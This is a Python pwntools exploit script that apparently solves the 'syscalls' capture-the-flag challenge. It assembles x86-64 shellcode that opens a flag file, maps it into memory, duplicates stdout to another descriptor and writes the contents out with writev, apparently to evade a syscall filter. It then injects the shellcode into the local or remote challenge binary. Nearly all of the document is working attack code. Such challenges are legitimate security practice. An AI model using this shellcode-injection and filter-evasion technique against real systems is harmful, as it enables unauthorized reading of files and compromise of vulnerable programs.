#!/usr/bin/python3
from pwn import *
from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
exe = './syscalls' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'error'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'syscalls.chal.uiuc.tf', 1337 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
breakrva 0x12d6
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================
def generateShellcode():
    if args.REMOTE:
        flagpath = "/home/user/flag.txt"
    else:
        flagpath = "/flag"
    
    shellcode = f'''
    BITS 64
    DEFAULT REL

    section .text
    global _start

    _start:
        ; openat
        xor rdx, rdx
        lea rsi, [flagpath]
        mov rax, 257
        syscall
        mov r9, rax ; save fd

        ; try to mmap
        mov rdi, 0
        mov rsi, 0x1000
        mov rdx, 0x7
        mov r10, 0x2
        mov r8, r9
        mov r9, 0
        mov rax, 0x9
        syscall

        ; store the mmap'ed address, and create the iovec struct
        mov r12, rax
        mov r9, r12
        add r9, 0x100
        mov [r9], r12
        mov qword [r9+8], 0x40

        ; dup2 stdout to 0x3e9
        mov rdi, 1
        mov rsi, 0x3e9
        mov rax, 0x21
        syscall

        ; call writev to duplicated fd
        mov rax, 0x14
        mov rdi, 0x000003e9
        mov rsi, r9 ; addr to iovec
        mov rdx, 1
        syscall
        
        ; exit gracefully because why not
        mov rax, 60
        xor rdi, rdi
        syscall

    flagpath: db "{flagpath}", 0
    '''
    
    with open("shellcode.asm", "w") as f:
        f.write(shellcode)
    
    run("nasm -f bin shellcode.asm -o shellcode.bin", shell=True, check=True)
    shellcode = open("shellcode.bin", "rb").read()
    
    return shellcode


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    
    shellcode = generateShellcode()
    print(len(shellcode))
    io.sendline(shellcode)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()